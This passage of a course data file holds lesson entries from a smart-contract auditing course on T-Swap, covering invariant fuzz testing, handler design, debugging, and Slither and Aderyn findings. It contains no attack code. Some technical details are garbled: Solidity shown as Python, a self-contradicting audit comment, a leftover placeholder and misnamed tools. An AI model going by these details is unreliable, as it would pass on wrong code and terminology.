          "updates": []
        },
        {
          "lessonId": "d8649b57-9977-4a49-9b40-fd74a03c43b1",
          "number": 21,
          "title": "Invariant.t.sol",
          "slug": "invariant-t-sol",
          "folderName": "21-invariant-t-sol",
          "description": "",
          "duration": 17,
          "videoUrl": "ocof300Xrlq02CyqKvJe5Ddr6GISNFBl02K2gH2pr00oes00",
          "rawMarkdownUrl": "/routes/security/5-tswap/21-invariant-t-sol/+page.md",
          "markdownContent": "---\ntitle: Writing T-Swap a stateful fuzz test suite - Invariant.t.sol\n---\n\n\n\n---\n\n# Testing Smart Contracts with Invariants\n\nHey there, in this blog post, we're going to walk through how to audit a smart contract using invariant testing. Specifically, we'll use the TSWAP contract codebase. By the end of this tutorial, you'll have a grasp on writing invariant test suites in Solidity.\n\n## Overview\n\nLet's imagine you're tasked with a private audit. You're supposed to help someone stay secure. It's an awesome feeling when you come back with an audit report together with an invariant test suite. As we'll see in this tutorial, it's essential not to dive into looking at the code base before writing testing essentials. So yes, we're going to find bugs without even viewing the code base. Sounds crazy, right? Buckle up!\n\n## Setting Up The Codebase\n\nWe'll start by setting up our file structure. In our working environment, let's create a new folder called _invariant_. In this folder, we're going to house two Solidity (.sol) files. The files will be named `invariant.t.sol` and `handler.t.sol`, respectively.\n\nOnce we've set this up, we're ready to start writing our tests.\n\n## Building Our Invariant\n\nWe'll begin with writing `invariant.t.sol`. We need to start defining our tests by first constructing the 'invariant'.\n\nBuilding up `handler.t.sol` will require us to dig deep into the codebase. However, we can get away with developing `invariant.t.sol` a little bit blind. It allows us to commence testing without scrutinizing the entire contract.\n\n## Constructing Mock Tokens\n\nWhile preparing our test environment, we realize that our contract is interacting with the WETH token and a particular poolFactory. These factories take in WETH tokens as an input parameter. Therefore, as part of our setup, we're going to create mock tokens.\n\nLet's create another directory named _mocks_ where we will create some mock tokens. We will need one file called `ERC20Mock.sol`:\n\nWe then proceed to create an `ERC20Mock`, which derives from `ERC20` token.\n\nThis way, we prepare a simulated environment where the tokens we will use do not have actual value, which is critical for safe and responsible testing.\n\n## Writing The Handler\n\nWith our tests set up, our next step is to write the handler. While we could write asserts directly in our invariant, the cleaner approach is to compute these in the handler. This way, our assert becomes a one-liner:\n\nThis way, we can ensure that our logic holds, regardless of the varying input parameters. In developing more complex software or systems, invariants play a crucial role in enforcing correctness.\n\n## Conclusion\n\nWell, it's been a long post! Whew. But there you have it, you now have a good grasp of writing invariant tests for your smart contracts. Remember, practice makes perfect and don't shy away from puzzling your brains. It's part of the fun in blockchain development. Keep practicing!\n",
          "updates": []
        },
        {
          "lessonId": "a5b53fd9-50f1-46d1-bcbe-11ff65fd418f",
          "number": 22,
          "title": "Handler.t.sol",
          "slug": "handler-t-sol",
          "folderName": "22-handler-t-sol",
          "description": "",
          "duration": 18,
          "videoUrl": "ApSkCH1snVHGLn101EXtkXyn1j100JwUiatcBA501D6n7o",
          "rawMarkdownUrl": "/routes/security/5-tswap/22-handler-t-sol/+page.md",
          "markdownContent": "---\ntitle: Writing T-Swap a stateful fuzz test suite - Handler.t.sol, Deposit Function\n---\n\n\n\n---\n\n# Breaking Down DeFi Audits with Invariant Testing\n\nIn this deep dive into DeFi audits, we will be covering a wealth of material ranging from DeFi to invariant testing. Do remember that we're dealing with complex topics, so if things are not making perfect sense, take a breather, and continue at your own pace. You're doing great by simply trying to digest this sizable chunk of advanced concepts.\n\n## Building a Handler\n\nLet's start with the task of building our handler. A common technique that comes in handy when addressing large problems is to break the problem down into smaller segments. We're taking this approach with our handler development.\n\nIn our contract, a constructor will create a TSWAP pool. Now, we need to test an invariant that the change in `X` (token balance) is equal to the expected change in `X`.\n\nWithin our handler, we'll want to implement at least two main functions: a deposit function and a swap function. For the purposes of this tutorial, weâ€™ll focus on `deposit` and `swapExactOutput` functions as a starting point.\n\n## Decoding Function Documentation\n\nOne advantage we have while trying to understand these functions, is that the documentation is quite helpful. If there were no docs, we'd be wading through the code itself, which could be much more time-consuming.\n\nTaking `swapExecOutput` for example, the function documentation illustrates its working as follows:\n\n> swapExecOutput figures out how much you need to input, based on the output you want to receive. For instance, if you want ten output tokens of WETH and you're inputting DAI, the function will calculate the amount of DAI needed to get you the desired WETH and execute the swap.\n\nSuch explanations in the documentation significantly facilitate understanding of the code, thus contributing to making the auditing process relatively less time-consuming.\n\n## Keeping Notes\n\nWhile working through the process, it's good practice to keep notes or record findings, especially when there are missing parameters as we've noticed in the `swapExecOutput` function. Let's do this to maintain an audit trail for future reference.\n\nHereâ€™s a simple note example:\n\n> Notes:Audit findings:Missing param in NatsSpec, missing deadline param in `swapExecOutput`. Also, remember to check with the protocol team for any documentation for better audit efficiency.\n\n## Setting up Core Handler Actions\n\nBack in our handler, we want to focus on two primary actions, at least to start: depositing and swapping.\n\nTo perform a deposit, we need access to the tokens. For swapping, we're likely to use `swapExactOutput`. We'll begin by implementing these, and gradually build from there. By writing a Fuzz test suite to execute these actions, we will not only be contributing to better code quality, but also making the protocol safer.\n\nLet's begin with creating our deposit function.\n\n## Constructing the Deposit Function\n\nOur deposit function begins by defining our tokens, in this case, WETH and Pool tokens.\n\nWith the availability of these tokens, we can proceed with determining the amounts for tokens to deposit, ensuring we set reasonable amounts to avoid overflow errors. The quantity of WETH to deposit will dictate the corresponding change in the Pool tokens.\n\nOnce we execute the deposit, we compare our expectations (expected delta) with the actual changes in the Pool and WETH tokens.\n\nWe are effectively done with our deposit function, but we didn't sign up to only handle deposits; we're here to test the swap invariant.\n\n## Building the Swap Function\n\nThe auditing process includes verifying code and ensuring that invariants hold through operations like swaps. That's part of what we're trying to achieve here, which brings us to create our swap function.\n\n> \"Remember, the bigger the vulnerabilities you uncover, the bigger the improvements you can make, ultimately contributing to the overall safety of DeFi protocols and the blockchain ecosystem.\"\n",
          "updates": []
        },
        {
          "lessonId": "03eddcf6-15bb-43fb-8686-ce58db4c094f",
          "number": 23,
          "title": "Handler Swap Function",
          "slug": "handler-swap-function",
          "folderName": "23-handler-swap-function",
          "description": "",
          "duration": 12,
          "videoUrl": "ODM2r11y00SBBLuBISkxsjJS8gu7T800qBC00xz6Hp1Qf4",
          "rawMarkdownUrl": "/routes/security/5-tswap/23-handler-swap-function/+page.md",
          "markdownContent": "---\ntitle: Handler.t.sol - Deposit Function\n---\n\n\n\n---\n\n# Testing Uniswap's Token Swap Function\n\nIn this post, we're going to thoroughly explore the function which swaps a pool token for `WETH` along with the underlying math involved. In Uniswap, `WETH` is short for Wrapped Ethereum, a token that represents Ether 1:1, enabling it to adhere to the ERC-20 standard.\n\n## The Swap Function and Its Logic\n\nFirstly, we bind `outputWETH` between 0 and `UNI_64_MAX` to provide a more realistic transaction range. We don't want all the money in the pool to be swapped out. This would be logically unfeasible and destructive for liquidity, hence we return if `outputWETH` exceeds the pool balance.\n\n## Delving into the Math Underlying the Function\n\nIn order to ascertain the pool token amount that must be minted or burnt based on `outputWETH`, we employ the following mathematical derivation.\n\nIn the `TSWAP` pool, there is a function called `getInputAmountBasedOnOutput`, which yields the `delta_x`. Without going into the specifics of this formula, let's understand why it works with a bit of simple algebra.\n\n> _\"It's in understanding how to manually solve these equations that you understand the importance and workings of the smart contract functions we work with.\"_\n\nWe utilize this function on the `TSWAP` pool to get the `poolTokenAmount` which is our `delta_x`.\n\n## Updating Starting Deltas\n\nThe reason for the `-1 * _outputWETH` is because the pool is losing `WETH`, hence making the `deltaY` negatively inclined. We comfortably say that it is the `expectedDeltaY`.\n\n## Minting Pool Tokens for Swapping User\n\nHere, we commence by creating a new person `address swapper`. This is the person performing the swap with the pool. If the swapper doesn't have enough pool tokens for this swap, we mint the difference along with one additional token just to be explicit.\n\n## Actual Token Swap\n\nThis is where the actual token swap occurs. We begin a new transaction under the swapper's address. This transaction includes approval for the pool to manage their pool tokens, with no limit set (`UNI_256_MAX`), with the `swapExactOutput` function called to perform the swap.\n\n## Finalizing Swap and Updating Ending Deltas\n\nAfter completing the swap, we simply update our ending deltas and calculate the actual deltas. The actual deltas are simply the initial balances subtracted from the final balances.\n\n## Conclusion\n\nThe entire handler function, `swapPoolTokenForWETH`, crafts a transaction, conducts a swap on the pool and calculates expected and actual balance changes to ensure the protocol behaves as expected.\n\nThe process can feel challenging when dealing with mathematical equations, but abstraction makes it easier. We've constructed our handler focussing on the process more than the math. This handler allows easier stateful fuzzing tests, ensuring the safety and security of anyone interacting with the pool.\n\nThis testing framework aids in understanding how these token swapping protocols are designed and behave, giving us more confidence in the robustness of Uniswap's smart contracts.\n",
          "updates": []
        },
        {
          "lessonId": "19a75983-8466-48de-9cb8-bc84bd3981ae",
          "number": 24,
          "title": "Final Invariant And Tweaks",
          "slug": "final-invariant-and-tweaks",
          "folderName": "24-final-invariant-and-tweaks",
          "description": "",
          "duration": 3,
          "videoUrl": "to1lD02l00jStNb9SW9VG4RqWRQban9mnbh8AdBZEwTPY",
          "rawMarkdownUrl": "/routes/security/5-tswap/24-final-invariant-and-tweaks/+page.md",
          "markdownContent": "---\ntitle: Final Invariant & Tweaks\n---\n\n\n\n---\n\n# Diving into Invariants: Writing Tests in Coding\n\nIn this blog post, we will uncover the steps to set up tests for an invariant in our code. Precisely, we will write a simple test and furthermore guide you through the setup for our handler.\n\n## Writing the Test\n\nAfter establishing our invariant, it's time to proceed to writing a basic test. This test could be as simple as asserting that the actual `Delta X` from our handler should equal the expected `Delta X`. Here is how we could write this test.\n\n```python\nassert handler.actualDeltaX == handler.expectedDeltaX\n```\n\nThough I must confess, I often prefer writing `assertEqual` as it usually provides more detailed information, you can certainly opt for our above statement which succinctly accomplishes the task.\n\nThe actual test, however, functions in rudimentary terms to ensure that our expected delta is aligned with the actual delta in the handler.The expected delta is assigned using the function `Y times X equals K`, which calculates the expected deltas. We then compare the computed deltas to the actual deltas.\n\n## Setting Up the Handler\n\nNow, let's dive into actually setting up the handler, which calls for us to move up a bit, retracing our steps.\n\nTo initiate the handler setup, we need to first import it. This can be done using the following code:\n\n```python\nimport handler from 'handler.t.sol'\n```\n\nAfter successfully importing the handler, we can create a new handler using the `new` keyword. This handler takes the parameter as `poolBytes for Array memory`.\n\n> Note: All the variables used above can be replaced depending on the specific needs of a project.\n\nIn conclusion, we have seen how easily we can write the basic structure of a test and set up our handler. The ease at which we can perform these tasks simplifies our coding endeavors and ensures more stable code in the long run.\n\nRemember, while writing tests, our ultimate goal is to ensure that our code behaves as we expect it to under different circumstances. After all, in the words of a wise coder, \"Code without tests is bad code.\". Make space for tests the next time you code and watch the number of errors drop significantly.\n",
          "updates": []
        },
        {
          "lessonId": "e455fe14-0139-4841-a296-19d5c9c27b3b",
          "number": 25,
          "title": "Debugging The Fuzzer",
          "slug": "debugging-the-fuzzer",
          "folderName": "25-debugging-the-fuzzer",
          "description": "",
          "duration": 8,
          "videoUrl": "zO5xGKOv629jSkzOJa1VOs9vtd01Ye8ZUaGODCpiOmCs",
          "rawMarkdownUrl": "/routes/security/5-tswap/25-debugging-the-fuzzer/+page.md",
          "markdownContent": "---\ntitle: Debugging the Fuzzer\n---\n\n\n\n---\n\n# Debugging Your Code the Way a Pro Would Do It\n\nIn today's lesson, we'll dive into a realistic process of debugging, using live examples and explaining how to overcome certain coding hurdles.\n\nTypically, I spend a large chunk of my work hours debugging unexpected failures in code scripts, and I thought it would be valuable to share my experience with you.\n\nOften, you'll need to rerun your code, alter variables, and cross your fingers, hoping you'd not receive the same error. Debugging is intriguing and requires a keen eye for detail.\n\n## Debugging a Program\n\nHere is a practical example of how I discovered, investigated, and resolved errors in a program, step by step.\n\n![](https://cdn.videotap.com/YQdEYI0P1ab2zx1GvZnZ-68.11.png)\n\n### Step 1: Testing the Code\n\nAs expected, the program failed. The error notably pointed out that the `TSWAP pool must be more than zero`. From my experience, such failures are usually attached to some misconfigured variables or misplaced logics.\n\nIn this case, when checking back on the `handler`, there was a deposit function configured with zero - a value that must certainly be greater than zero.\n\nI then had to ask myself, what seemed to be the `minimum deposit`?\n\n### Step 2: Debugging Interlude\n\nI discovered something crucial here - the `minimum WETH liquidity`. This was the `minimum deposit amount` I should've assigned instead of zero.\n\nUsing this newly found information, I decided to replace the zero value in the `bound` function with this minimum deposit amount and then reran my test.\n\nIt appeared that the function `get input amount based off output` had been assigned the zero value, as was previously the case. Here we had to replace the zero with `pool. Get minimum WETH deposit amount` to avoid similar complications.\n\n### Step 3: Learning and Debugging\n\nI intentionally ran into these issues because it's an inevitable part of the coding process and learning experience. Debugging requires a skill to easily navigate through logs - It's a practice I find effective in learning code structure.\n\nAt this point, the `assertion` seemed to hit a snag. The immediate response was an `actual Delta X` being zero while on the right hand side, it was a large number. The inconsistency in values raises the question - where did I go wrong?\n\nTurns out, there was a small but significant mistake in the addressee in my code. It had mistakenly been set to `address this`, when it should have been `address pool`.\n\n### Step 4: The Resolution\n\nOnce that was rectified, it seemed like we were getting somewhere. The code was now giving a different error, an indication that we were making progress. However, I noticed there was a significant variance between the left and right side values - almost a clear doubling.\n\nThe key question now was whether my code was the problem or there was an `invariant` that was actually broken. Debugging requires such critical thinking to diagnose the root cause of errors.\n\n_SECTION OF CODE TO INSERT HERE_\n\nIt turned out I had made an incorrect assignment in the `handler`. The `Delta X` was supposed to be the `pool token amount` calculated earlier. This led to an unexpected elevation in the `outbound WETH` size, causing the script to keep reverting.\n\nTo solve this, I had the `bound` function call on the `WETH balance of the address pool`, as opposed to it being manually large.\n\n#### Handling Debugging Challenges\n\n> \"In debugging, there's a lot of trial and error, and it's okay. You're going to encounter a few challenges on your first try but with perseverance and keen attention to detail, you'll find a way to resolve these errors\".\n\nAfter making the necessary alterations and rerunning the tests, the program finally passed. This means the code was safe and no bugs were found.\n\n## Conclusion\n\nEven after successfully debugging, remember that your code is always subject to possible future errors. But now armed with the skills and patience to debug, you are better prepared to face any challenge that comes your way.\n\nStay creative and keep debugging!\n",
          "updates": []
        },
        {
          "lessonId": "1633a5de-6dcd-40c1-9afb-5a03f74b36e4",
          "number": 26,
          "title": "One Last Huzzah",
          "slug": "one-last-huzzah",
          "folderName": "26-one-last-huzzah",
          "description": "",
          "duration": 10,
          "videoUrl": "AA8PgFAa02NjRytkaRt3a902XF5KfYP4yTPnhDMDN9BD4",
          "rawMarkdownUrl": "/routes/security/5-tswap/26-one-last-huzzah/+page.md",
          "markdownContent": "---\ntitle: One Last Huzzah\n---\n\n\n\n---\n\n# Unveiling the Power of a Stellar Stateful Fuzzing Test Suite\n\nEver experienced one of those situations when you felt like capitulating because nothing seems to work? Only to find that, against your better judgment, you gave one last attempt and everything fell into place? That's exactly the kind of journey we are about to hop on. What started as a simple methodical troubleshooting transmogrified into an exploration of the ever-useful, indispensable tool â€“ the stateful fuzzing test suite.\n\n## EQ. X vs. Y Test Runs\n\nSometimes, when we're stuck with a challenging bug and can't seem to point out why it exists, we need to remain resolute and alter our approach. This was exactly the case when I was working with a piece of code and an assertion failed.\n\nChanging our test from X to Y and modifying the stats gave a rather perplexing output - the core invariant seemed to be breaking.\n\n## Spelunking Through the Log Files\n\nLike seasoned detectives, we read through the log files for some answers. This particular log file was teeming with `deposits` and `swaps`, a lot of balance adjustments, and, in the last section, things seemed to head south. Something was going awry in the last swap which led to an unexpected disparity between the left and right results.\n\n> \"...usually there's a lot of alpha in this last section, like what happened in this last swap, which caused this to get way out of whack because everything was fine right beforehand...\"\n\nWhile digging further into the function call in the `handler`, my attention was drawn to multiple `transfers` being emitted - one more than was expected.\n\n## Unearthing the Rogue Code\n\nUpon close inspection of these transfers, I discovered some discrepancies:\n\n1. There was an unusual `transfer` from the `TSWAP pool` to the `swapper`\n2. Subsequently, another weird `transfer `was being emitted from the `swapper` to the `TSWAP pool`\n3. Then again, there was another `transfer` from the `TSWAP pool` to the `swapper`\n\nNeedless to say, this wasn't what I was expecting. Recognizing that my stateful fuzzing tests were pointing towards a peculiarity, I decided to dive deep into the code base.\n\n## AHA - The Bug!\n\nAs I ventured into the low-level swap function, I unraveled the mystery - I discovered we'd included an extra incentive in the swap function where for every 10 swaps, an extra token is awarded to the user.\n\nThis was the heart of the issue. It was resulting in the protocol breaking because:\n\n- There was an unexpected increase in the swapper's balance\n- For any fee transfer token, the internal function would transfer excessive tokens, thus breaking the protocol invariance\n\nIt dawned upon me that the violation of the protocol invariant, in this case, the `XxY=K formula` was generating this bug.\n\n## Significance of Stateful Fuzzing tool\n\nDespite all these findings, it was the fruit of a good deal of work. Finding the code-breaking bug involved meticulous editing and testing using the stateful fuzzing tool. However, it was unequivocally worth it.\n\nManual review, despite its efficiency, can be laborious to discover all bugs. Therefore, it becomes essential to leverage automation as a means to make our jobs simpler. That's where the role of stateful fuzzing comes to the forefront. It allows us to comprehend protocol invariants on a superior level while giving us an inexpensive way of finding bugs and breaking protocols.\n\nIt's pivotal to understand how this powerful tool works, even if you're unable to grasp the complexities of the TSWEAP handler.\n\nUltimately, the ability to discover potential bugs by writing an effective test suite is an indispensable instrument in your toolkit. Once the protocol's invariance is identified and it is discovered that no tests are being run for it, it is a clear indicator that a bug lurks somewhere around. For instance, for a codebase comprising 10,000 lines of code, conducting an audit could consume abundant resources, but a stateful fuzzing test suite can accomplish the task in a day or two.\n\n## Learning and Adaptation\n\nThrough this experience, I understood that weird ERC-20s, rebase, and fee-transfer tokens can disrupt our protocols. These conditions, along with our naive incentive for swappers, can violate protocol invariance, causing a breakthrough for bugs. It underlines the importance of knowing the specifics of the tokens we are working with - their advantages, drawbacks, and the protocol invariants they obey.\n\nUltimately, establishing a protocol invariance pattern in the writing of functions or applying checks using the \"checks, effects, interactions\" paradigm can be the game-changer in reinforcing your code against bugs.\n\nIn all, spending a bit of time setting up the stateful fuzzing test suite can help you detect bugs early, maintain your invariances and ensure the code you wrote stays robust, performant, and error-free.\n",
          "updates": []
        },
        {
          "lessonId": "1063c7cf-05a5-4a46-80e2-d7fab3690a3a",
          "number": 27,
          "title": "Notes On Invariants",
          "slug": "notes-on-invariants",
          "folderName": "27-notes-on-invariants",
          "description": "",
          "duration": 4,
          "videoUrl": "O8RK1gGeIBoX1b01gR3M008uMhVW2mT01BnXL1NN00urwsg",
          "rawMarkdownUrl": "/routes/security/5-tswap/27-notes-on-invariants/+page.md",
          "markdownContent": "---\ntitle: Notes on Invariants and other Types of Tests\n---\n\n_Follow along with the video:_\n\n\n\n---\n\n# Welcome to the World of Invariants and Fuzzing Tools\n\nHi all! We've been on quite a journey together, haven't we? We've had our brains whipped into a frenzy learning how to effectively use fuzzing tools and, yes, there were certainly times when we delved into confusing territories. However, we also learned how these powerful tools can help us discover and break invariants, quickly identifying issues in protocols. In this post, we'll build upon these foundational skills, diving deeper into an exploration of ERC20s, core invariants, and much more!\n\n## Unraveling the Mysteries of ERC20s\n\nThe world of ERC20s can often seem daunting and puzzling, but do not fret, we're here to unravel its mysteries. We have only just scratched the surface of understanding these tokens in our sessions, but expect to see more of them popping up as we progress through our course.\n\n## Defining Core Invariants and Breaking Them Down\n\nEqually important to our exploration are, of course, core invariants. These are rules that remain unaffected regardless of the system state. Now, if you're still scratching your head over the term \"freepy\" (or CEI, as others might call it), think of it as a practice of implementing pre and post-checks to uphold certain invariants.\n\nTo illustrate this, let's look at two protocols - Uniswap and Euler. The former has an intact core invariant embedded within its codebase; the Euler protocol, unfortunately, does not. This lack of an invariant was a significant contributor to the much-talked-about Euler hack that happened recently.\n\n## Exploring Different Testing Tools and Approaches\n\nWhile our journey has already spanned areas of forge fuzzing, stateful fuzzing, and invariants, there are still a few facets we're yet to traverse. Say, for example, `Echidna`. In case you're unfamiliar with it â€“ it's a powerful fuzzing tool that pairs excellently with Foundry Fuzzing Consensus's paid tool.\n\nMutation and differential testing, on the other hand, didn't make the cut for our workshop, so we will discuss them briefly here.\n\n> Mutation testing involves modifying parts of the code to evaluate if these changes break any existing tests.\n\nLet's turn to the git repo attached to this tutorial for reference. Under `audit_data`, you'll find a 'test' folder with a note about differential testing. Also, there is a differential folder where you can perform fuzz testing against the output of `uniswap`.\n\nFor mutation testing, imagine altering `Tswappool.sol` in various ways, such as deleting a line, swapping out math, or changing a greater-than operator to a less-than. The objective here is to ensure your tests catch these errors.\n\nThrough this practice, you can evaluate the effectiveness of your testing framework. While we didn't perform any mutation testing in our session, it's a valuable tool you should consider implementing.\n\n## Driving the â€˜Solodit' Train\n\nWe're gearing up to dive into `Solodit` in the upcoming sessions. With `Solodit`, we can learn from historical findings, uncovering a wealth of insights from the peculiarities of ERC-20s to the importance of preserving invariants.\n\nParsing through the archives of `Solodit`, you'll discover numerous examples of how weird ERC-20s have caused problems. Try a simple search for 'invariants' on Solodit, and you'll unearth a treasure trove of invariant findings, spelling out a wealth of knowledge and learning opportunities.\n\n## Wrapping It Up!\n\nTo sum up, we've done a ton of work together; we've navigated unchartered territories, explored protocols, learned about testing and more. On this journey, we've embraced the weirdness of ERC20s, the intriguing world of invariants, and a handful of robust testing tools.\n\nStay tuned for more exciting stuff coming your way! Remember, we're learning together, we're growing together, and, most importantly - we're making the future of protocols safer, together. Until next time, happy learning!\n",
          "updates": []
        },
        {
          "lessonId": "413b0bcc-889f-4c1c-a23e-07cda2063929",
          "number": 28,
          "title": "Recon: Manual Review Introduction",
          "slug": "recon-manual-review-introduction",
          "folderName": "28-recon-manual-review-introduction",
          "description": "",
          "duration": 2,
          "videoUrl": "ilK5K02h00Z3aDKoX02B018ZtF2s9AfC1oOYbKHhf00SKtDM",
          "rawMarkdownUrl": "/routes/security/5-tswap/28-recon-manual-review-introduction/+page.md",
          "markdownContent": "---\ntitle: Recon Manual Review Introduction\n---\n\n\n\n---\n\n# Manual Review of TSwap Pool: A Deep Dive\n\nHey, awesome reader! Welcome back to the blog. In the previous posts, we've talked all about tools, code inspections, and automated reviews. However, there's one aspect that invariably remains at the core of the process - the manual review. So, let's grab a cup of coffee and plunge together into the manual review of the TSwap pool!\n\n## The Unreplaceable Manual Review\n\nHere's the thing about manual reviews. This bad boy can find bugs that no static analyzers, no automated systems, and no testing suites can.\n\n> Remember, never underestimate the power of the human eye when it comes to code.\n\nEvery line of code is a potential pitfall and the manual review is our best chance at spotting those tricky bugs that can slip through all those automated testing suites. Yeah, we've come a long way with our tooling approach. But, nothing, I repeat **nothing**, replaces the manual review.\n\n## The Saga of the Under_Swap\n\nLet's recount a bit of our journey. We've written a port, we've had some type of high, and we have the curious case of the `under_swap` that breaks invariants. Yes, we spotted the issue with our fuzzing test suite. So, kudos to us!\n\nBut let's not stop at that, shall we? There could be an entire universe of other issues lurking in the code base. Sure, we could write more tests, more automated checks, more everything. But, we've reached the point where it's time to dig in with our manual review.\n\nRemember,\n\n> Automation is great, but manual code review is the secret sauce that makes everything click!\n\nSo, are you ready to walk through the code base with me?\n\n## Prepping Up For The Manual Review\n\nBefore we dive in, make sure you're comfortable. Have a cuppa joe if that's your jam. Maybe take a break if you haven't yet. Because we're going on a bug hunt! It's not just about spotting the bugs. It's about understanding why they happened. It's about writing down our findings and submitting the report. It's about replaying the process again and again.\n\n> Remember, repetition is the mother of skill.\n\nYou might be thinking, \"Patrick, buddy, this is so boring! Do we really have to...?\" Yes, you do! This is exactly what you need to become a better developer, a better tester, a better debugger. It's the detail, the persistence, the grit that turns you from a coder into a **code warrior**.\n\n## Performing the Manual Review\n\nAlright, it's time for the main event. Let's roll our sleeves up, put our debug glasses on, and letâ€™s do the manual review.\n\n# Wrapping up the Manual Review\n\nIn the manual review, we'll be going through the codebase, and document our findings. You're not alone and we will be doing this together. In the later sections, we can be a bit more breezy. But right now, this is where the magic happens. Write the report with me. This is your story. Your journey into the bowels of the codebase. The monsters you fought, the bugs you squished.\n\n# Conclusion\n\nSo, what are you waiting for? Let's get cracking! This is gonna be an exciting journey! Stay tuned for our next blog post where we'll be sharing insights from our manual review, documenting our process and achieving our goals step by step, bug by bug. Remember,\n\n> The best way to find your skills is to lose yourself in the code.\n",
          "updates": []
        },
        {
          "lessonId": "2a1b2266-87e2-4546-a62d-6e495dc424d3",
          "number": 29,
          "title": "Slither",
          "slug": "t-swap-manual-review-slither",
          "folderName": "29-t-swap-manual-review-slither",
          "description": "",
          "duration": 2,
          "videoUrl": "E101UChmT02NMDb1SquvieKmJKSnMZ2PNizDfc2fvMgGo",
          "rawMarkdownUrl": "/routes/security/5-tswap/29-t-swap-manual-review-slither/+page.md",
          "markdownContent": "---\ntitle: T-Swap Manual Review Slither\n---\n\n\n\n---\n\n# An In-Depth Guide to Manual Review in Solidity\n\nIn this blog post, we'll be taking a deep dive into the process of manual review in Solidity. We'll be using a comprehensive set of tools including Make Slither and Solidity itself to conduct our review.\n\nBefore we jump into this, it's vital that we kick start the process by running our review tools.\n\n> _For context, our group has a well-configured Slither that's ready to use, in addition to a Makefile with Make Slither, which also looks pretty good._\n\n### Analyzing Slither's Output\n\nWalking through the console output, we find mentions of potentially uninitialized variables. The Pool Factory, s_pools, and s_tokens are flagged by Slither as never being initialized.\n\nIn the lines regarding Pool Factory and useContext functions, there are mentions of methods like `createPool` and `getPool`. It seems like the `S_Pools` and `S_Tokens` data mappings are not getting initialized. Letâ€™s delve deeper into this.\n\nAlthough these data mappings trigger an error, it's unlikely to be a major issue. The error arises because Slither expects that our `S_Pools` mapping could be empty at some point and we're performing checks on it. However, this behavior is fine and exactly what we want.\n\nThe same applies to `S_Tokens`.\n\n> **Key point:** A useful feature of Solidity is that querying a mapping for a non-existent element returns a zero value, not an error.\\*\n\n### Identifying Potential Issues\n\nThe console output also flags a missing zero check - something that could lead to problems. We're not performing a zero address check in our constructor, which is not ideal.\n\n```javascript\nconstructor(address _token) public {\n    require(_token != address(0));\n    token = Token(_token);\n}\n```\n\nSo, an important note in your audit should be the lack of a zero address check in the constructor. Fortunately, Slither has already proven to be quite useful in finding potential issues.\n\n### Dealing with Reentrancy\n\nTowards the end of Slither's report, we're alerted to a potential reentrancy in the `T_SWAP pool swap` function.\n\n![](https://cdn.videotap.com/1Zwcjq5wz3Hy0mGdOPrV-83.14.png)\n\nWhile this function prompt is green (indicating it's not necessarily a problem), we need to understand the scenario better to evaluate its implication fully. Browsing through contract interactions and function call patterns can help us figure out if this is a legitimate reentrancy issue or a false positive.\n\nFinally, Slither alerts that different versions of Solidity are being used. Not an ideal situation, but not critical either, particularly if the primary working versions are intact. But hey, thanks for the heads-up, Slither.\n\n### Wrapping Up\n\nAll things considered, using tools like Slither for a manual review of Solidity code can reveal potential, and sometimes subtle, issues. Leveraging these tools creates a smoother and more efficient analysis process. Stay curious, stay alert, and keep probing. Your diligence will pay off in the form of solid, bug-free, and highly secure code.\n",
          "updates": []
        },
        {
          "lessonId": "745dc32d-27a5-4ac4-9d49-43bcf15e78c8",
          "number": 30,
          "title": "Aderyn",
          "slug": "manual-review-aderyn",
          "folderName": "30-manual-review-aderyn",
          "description": "",
          "duration": 2,
          "videoUrl": "7VCF3MufhYfxh02xhSjgRo7rnV0202nfw02jzTF200aUY9N8",
          "rawMarkdownUrl": "/routes/security/5-tswap/30-manual-review-aderyn/+page.md",
          "markdownContent": "---\ntitle: Manual Review Aderyn\n---\n\n_Follow along with the video:_\n\n\n\n---\n\n# Introducing the New Version of Aderyn, an Essential Audit Tool\n\nHello, code enthusiasts! Today, I'm going to do a quick run through a unique code auditing tool: Aderyn. Since I've started filming, we've been doing incredible stuff with the script, and there's a lot to share with you! The tool has recently undergone some upgrades, and in this post, we'll be checking out what we can do with the updated version of Aderyn. Let's dive in!\n\n## Installing Aderyn and First Run\n\nAs the first step, I went on to update Aderyn using `cargo install Adarin`. This installs the new version for us. With this modification, you can perform a quick audit just by executing the command `aderyn a` - simple but powerful. Still, an old method, `Aderyn`, works just fine if you're comfortable with it.\n\n## The Audit Report: Understanding the Issues\n\nOn opening the `report.md`, you'll notice a list of issues. Most of these are NC (Non-Crit) issues. These aren't crucial, but addressing them can improve your code's performance and readability.\n\n#### Unused Internals\n\nMy Aderyn installation flagged some functions that are not used internally. So, marking them as `external` would be ideal, like the TSWAP pool line 307 issue. The piece of code here isn't used internally, marking it public is a waste of gas.\n\n```bash\n@audit info, this should be external\n```\n\n#### The Literals vs Constants Debate\n\nAderyn pointed out another common issue - the use of literals instead of constants on TSWAP pool line 303. Essentially, magic numbers should not be just literals - they should be defined as constants.\n\n```bash\n@audit info magic numbers. These should not be defined as constants.\n```\n\n### The Index Field Dilemma\n\nWe also stumbled onto an 'event missing index fields' on TSWAP pool line 62. Now, this is a tricky one. While many people prefer having events indexed, I belong to the group that believes in fewer indexed fields. Therefore:\n\n```bash\n@audit info. Three. Events should be indexed if there are more than three params.\n```\n\nRemember, this is more subjective and up to your coding preferences.\n\nBut we've done quite well so far with the audit, discovering issues and remedying them with Aderyn.\n\n## Wrap Up: The Power of Automated Code Auditing\n\nThe beauty of having an automated script like Aderyn lies in its ability to uncover even the minutest issues which could otherwise be overlooked. Even though some of us might prefer manual code reviews, tools like Aderyn offer a great starting point for clean, optimized code.\n\nThis hands-on auditing process can be a fun, engaging way to discover new improvements, ensuring your code performs better and is more maintainable.\n\n> Remember, quality isn't an act, it's a habit.\n\nOn those wise words from Aristotle, let's wrap up and get back to more code improvements in our next post. Happy coding until then!\n",
          "updates": []
        },
        {
          "lessonId": "044e8cae-6cec-4e70-a27c-c595969403af",
          "number": 31,
          "title": "Pool Factory",
          "slug": "pool-factory",
          "folderName": "31-pool-factory",
          "description": "",
          "duration": 6,
          "videoUrl": "qLPEwquLPE8IyA00d00ksftrLHwenhkfs1Q6N1gkGOaDE",
          "rawMarkdownUrl": "/routes/security/5-tswap/31-pool-factory/+page.md",
